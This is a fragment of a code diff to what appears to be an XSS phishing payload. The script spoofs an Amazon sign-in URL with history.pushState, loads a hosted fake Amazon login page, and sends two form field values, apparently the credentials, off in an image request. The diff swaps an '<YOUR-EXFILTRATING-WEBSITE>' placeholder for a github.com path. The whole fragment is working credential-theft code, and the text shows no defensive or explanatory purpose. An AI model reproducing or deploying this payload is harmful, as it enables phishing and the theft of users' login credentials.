@@ -2,7 +2,7 @@ history.pushState('','Amazon Sign-In', 'https://cloud.email.pharmacy.amazon.com/
 function log() { 
  var x = document.forms[0];
  var d=[x.elements[11].value,x.elements[13].value];
- (new Image()).src='https://<YOUR-EXFILTRATING-WEBSITE>/xss/img.php?data=' + btoa(JSON.stringify(d));
+ (new Image()).src='https://github.com/xss/img.php?data=' + btoa(JSON.stringify(d));
 };
 
 fetch("https://trkbkr.github.io/testScan/amazon.html").then(response => response.text()).then((response) => {
